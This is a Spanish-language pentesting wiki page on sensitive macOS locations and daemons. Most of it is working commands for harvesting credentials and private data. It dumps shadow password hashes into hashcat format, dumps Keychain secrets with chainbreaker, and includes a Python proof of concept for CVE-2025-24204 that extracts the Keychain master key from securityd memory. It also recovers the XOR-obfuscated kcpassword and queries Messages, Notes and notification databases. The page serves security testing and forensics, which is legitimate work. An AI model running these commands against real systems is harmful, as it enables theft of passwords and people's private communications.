# Ubicaciones sensibles y daemons interesantes de macOS

{{#include ../../../banners/hacktricks-training.md}}


## Contraseñas

### Contraseñas shadow

La contraseña shadow se almacena junto con la configuración del usuario en archivos plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\
El siguiente comando de una línea se puede usar para volcar **toda la información sobre los usuarios** (incluida la información de los hashes):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**este**](https://github.com/octomagon/davegrohl.git) pueden usarse para transformar el hash al **formato** de **hashcat**.

Una alternativa en una sola línea que volcará las credenciales de todas las cuentas que no sean de servicio en formato hashcat `-m 7100` (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Otra forma de obtener el `ShadowHashData` de un usuario es mediante `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Convertir el ShadowHashData copiado en Linux

Si el atributo se copió a un host de cracking Linux, guarda **solo sus bytes hexadecimales** (no la etiqueta `ShadowHashData:`) en `shadowhash.hex`. En Ubuntu, `libplist-utils` convierte el plist binario decodificado en XML legible sin usar `plutil` de macOS.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

En el XML, usa `iterations` y el `salt` y `entropy` en base64 de **`SALTED-SHA512-PBKDF2`**, no el verificador SRP separado. Asigna a `salt_b64` y `entropy_b64` el contenido de sus respectivos elementos XML `<data>`. Decodifícalos a hexadecimal y forma una sola línea así: `$ml$<iterations>$<salt_hex>$<entropy_hex>` para el modo `7100` de Hashcat. Esto es un intento de adivinar contraseñas sin conexión después de obtener hashes con privilegios; no es un método de acceso inicial ni de escalada de privilegios.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Este archivo **solo se usa** cuando el sistema se ejecuta en **modo de usuario único** (por lo que no ocurre con mucha frecuencia).

### Keychain Dump

Ten en cuenta que, al usar el binario security para **volcar las contraseñas descifradas**, aparecerán varios mensajes que pedirán al usuario que permita esta operación.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

En macOS moderno, los almacenes subyacentes más interesantes suelen ser **`~/Library/Keychains/login.keychain-db`** y **`/Library/Keychains/System.keychain`**. Son archivos respaldados por SQLite, pero el acceso a texto plano sigue estando mediado por **`securityd`**: robar la DB sin procesar principalmente te da metadatos y blobs cifrados, a menos que también recuperes la contraseña del usuario, `SystemKey` o una master key en memoria.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Según este comentario [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), parece que estas herramientas ya no funcionan en Big Sur.

### Descripción general de Keychaindump

Se ha desarrollado una herramienta llamada **keychaindump** para extraer contraseñas de los keychains de macOS, pero tiene limitaciones en versiones más recientes de macOS, como Big Sur, según se indica en una [discusión](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). El uso de **keychaindump** requiere que el atacante obtenga acceso y escale privilegios a **root**. La herramienta aprovecha que el keychain se desbloquea de forma predeterminada cuando el usuario inicia sesión, por comodidad, lo que permite que las aplicaciones accedan a él sin tener que solicitar la contraseña del usuario repetidamente. Sin embargo, si el usuario opta por bloquear su keychain después de cada uso, **keychaindump** deja de ser eficaz.

**Keychaindump** actúa sobre un proceso específico llamado **securityd**, descrito por Apple como un daemon para operaciones de autorización y criptográficas, fundamental para acceder al keychain. El proceso de extracción consiste en identificar una **Master Key** derivada de la contraseña de inicio de sesión del usuario. Esta clave es esencial para leer el archivo del keychain. Para encontrar la **Master Key**, **keychaindump** analiza el heap de memoria de **securityd** mediante el comando `vmmap`, buscando posibles claves en áreas marcadas como `MALLOC_TINY`. El siguiente comando se usa para inspeccionar estas ubicaciones de memoria:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Tras identificar posibles master keys, **keychaindump** busca en los heaps un patrón específico (`0x0000000000000018`) que indica un posible candidato a master key. Para utilizar esta clave se requieren pasos adicionales, incluida la desofuscación, tal como se describe en el código fuente de **keychaindump**. Los analistas que se centren en esta área deben tener en cuenta que los datos cruciales para descifrar el keychain se almacenan en la memoria del proceso **securityd**. Un ejemplo de comando para ejecutar **keychaindump** es:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) puede extraer los siguientes tipos de información de un keychain de macOS de forma forense:

- Contraseña hash del Keychain, apta para crackear con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
- Contraseñas de Internet
- Contraseñas genéricas
- Claves privadas
- Claves públicas
- Certificados X509
- Notas seguras
- Contraseñas de Appleshare

Si se proporciona la contraseña de desbloqueo del keychain, una clave maestra obtenida con [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará las contraseñas en texto plano.

Sin uno de estos métodos para desbloquear el Keychain, Chainbreaker mostrará toda la demás información disponible.

#### **Dump de claves del keychain**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump de claves del keychain (con contraseñas) con SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Volcar claves del keychain (con contraseñas) y crackear el hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump de claves del llavero (con contraseñas) con memory dump**

[ Sigue estos pasos](../index.html#dumping-memory-with-osxpmem) para realizar un **memory dump**.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump de claves del llavero (con contraseñas) usando la contraseña del usuario**

Si conoces la contraseña del usuario, puedes usarla para **hacer dump y descifrar los llaveros que le pertenecen**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Clave maestra de Keychain mediante el entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) incluía `/usr/bin/gcore` con el entitlement **`com.apple.system-task-ports.read`**, por lo que cualquier administrador local (o aplicación maliciosa firmada) podía volcar la memoria de cualquier proceso incluso con SIP/TCC aplicados. Volcar `securityd` filtra la **clave maestra de Keychain** en texto claro y permite descifrar `login.keychain-db` sin la contraseña del usuario.<sup>[[1]](#references)</sup>

**Reproducción rápida en versiones vulnerables (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Introduce la clave hexadecimal extraída en Chainbreaker (`--key <hex>`) para descifrar el llavero de inicio de sesión. Apple eliminó el entitlement en **macOS 15.3+**, por lo que esto solo funciona en versiones de Sequoia sin parchear o en sistemas que conservaron el binario vulnerable.

### kcpassword

El archivo **kcpassword** contiene la **contraseña de inicio de sesión del usuario**, pero solo si el propietario del sistema ha **activado el inicio de sesión automático**. Por lo tanto, el usuario iniciará sesión automáticamente sin que se le solicite una contraseña (lo cual no es muy seguro).

La contraseña se almacena en el archivo **`/etc/kcpassword`** con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** aplicada mediante XOR. Si la contraseña del usuario es más larga que la clave, esta se reutilizará.\
Esto hace que la contraseña sea bastante fácil de recuperar, por ejemplo, con scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Información interesante en bases de datos

### Mensajes

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notificaciones

Antes de **Sequoia**, normalmente puedes encontrar el almacén de Notification Center en **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. En **Sequoia+**, Apple lo trasladó al contenedor de grupo protegido por TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

La mayor parte de la información interesante se almacena dentro de columnas **blob**, así que tendrás que extraer ese contenido y transformarlo en algo legible (`plutil -p -`, `strings` o un pequeño parser). Ejemplos rápidos de triage:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Problemas recientes de privacidad (base de datos de NotificationCenter)

- En macOS **14.7–15.1**, Apple almacenaba el contenido de los banners en la base de datos SQLite `db2/db` sin una redacción adecuada. Las CVE **CVE-2024-44292/44293/40838/54504** permitían a cualquier usuario local leer el texto de las notificaciones de otros usuarios con solo abrir la base de datos (sin solicitud de TCC).<sup>[[3]](#references)</sup>
- Apple mitigó este problema trasladando la base de datos a `group.com.apple.usernoted` y protegiéndola con TCC en las versiones más recientes de Sequoia; por eso, en los sistemas actuales normalmente se necesita el contexto de usuario adecuado o un TCC bypass para leerla.<sup>[[4]](#references)</sup>
- En endpoints antiguos, copia juntos los archivos `db`, `db-wal` y `db-shm` antes de actualizar o reiniciar si quieres conservar los artefactos.

### Notas

Las **notas** de los usuarios se pueden encontrar en `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Si el one-liner de arriba genera demasiado ruido, exporta `ZICNOTEDATA.ZDATA`, descomprímelo con gunzip y analiza el protobuf: suele ser más fiable que ejecutar `strings` directamente en SQLite.

### Tareas en segundo plano / Elementos de inicio de sesión

Desde **Ventura**, los elementos de inicio de sesión aprobados por el usuario y varias tareas en segundo plano se registran en almacenes **BTM**, como **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** y la caché del sistema con versión **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Estos archivos son útiles para identificar rápidamente la persistencia, las herramientas auxiliares y algunos elementos en segundo plano administrados por MDM:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Para el ángulo de persistencia y los detalles internos de BTM, consulta [la página de ubicaciones de inicio automático](../../macos-auto-start-locations.md#login-items) y [las notas de Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferencias

En las apps de macOS, las preferencias se encuentran en **`$HOME/Library/Preferences`** y, en iOS, en `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

En macOS, se puede usar la herramienta cli **`defaults`** para **modificar el archivo de preferencias**.

**`/usr/sbin/cfprefsd`** reclama los servicios XPC `com.apple.cfprefsd.daemon` y `com.apple.cfprefsd.agent`, y se puede invocar para realizar acciones como modificar preferencias.

## OpenDirectory permissions.plist

El archivo `/System/Library/OpenDirectory/permissions.plist` contiene permisos aplicados a los atributos de nodo y está protegido por SIP.\
Este archivo concede permisos a usuarios específicos mediante UUID (y no uid), lo que les permite acceder a información confidencial específica, como `ShadowHashData`, `HeimdalSRPKey` y `KerberosKeys`, entre otros:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Notificaciones del sistema

### Notificaciones de Darwin

El daemon principal de notificaciones es **`/usr/sbin/notifyd`**. Para recibir notificaciones, los clientes deben registrarse a través del puerto Mach `com.apple.system.notification_center` (compruébalo con `sudo lsmp -p <pid notifyd>`). El daemon se configura mediante el archivo `/etc/notify.conf`.

Los nombres utilizados para las notificaciones son identificadores únicos en notación DNS inversa. Cuando se envía una notificación a uno de ellos, la reciben los clientes que hayan indicado que pueden gestionarla.

Es posible volcar el estado actual (y ver todos los nombres) enviando la señal SIGUSR2 al proceso notifyd y leyendo el archivo generado: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

El **Distributed Notification Center**, cuyo binario principal es **`/usr/sbin/distnoted`**, es otra forma de enviar notificaciones. Expone algunos servicios XPC y realiza algunas comprobaciones para intentar verificar a los clientes.

### Apple Push Notifications (APN)

En este caso, las aplicaciones pueden registrarse para **topics**. El cliente generará un token al contactar con los servidores de Apple a través de **`apsd`**.\
Luego, los proveedores también habrán generado un token y podrán conectarse a los servidores de Apple para enviar mensajes a los clientes. **`apsd`** recibirá estos mensajes localmente y retransmitirá la notificación a la aplicación que está esperándola.

Las preferencias se encuentran en `/Library/Preferences/com.apple.apsd.plist`.

En macOS, hay una base de datos local de mensajes en `/Library/Application\ Support/ApplePushService/aps.db`, y en iOS, en `/var/mobile/Library/ApplePushService`. Tiene 3 tablas: `incoming_messages`, `outgoing_messages` y `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

También es posible obtener información sobre el daemon y las conexiones mediante:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Notificaciones del usuario

Estas son notificaciones que el usuario debería ver en pantalla:

- **`CFUserNotification`**: Esta API permite mostrar una ventana emergente con un mensaje en pantalla.
- **The Bulletin Board**: Muestra en iOS un banner que desaparece y se almacena en el Notification Center.
- **`NSUserNotificationCenter`**: El servicio heredado del centro de notificaciones en macOS. En versiones anteriores, la base de datos suele estar en `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; en Sequoia y versiones posteriores, se trasladó a `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – El entitlement gcore de macOS permitió extraer la clave maestra del Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Protección de datos del Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Divulgación de SQLite del Notification Center (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple aborda las preocupaciones sobre la privacidad en torno a la base de datos del Notification Center en macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – Cracking de contraseñas en macOS](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashes de ejemplo de Hashcat – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
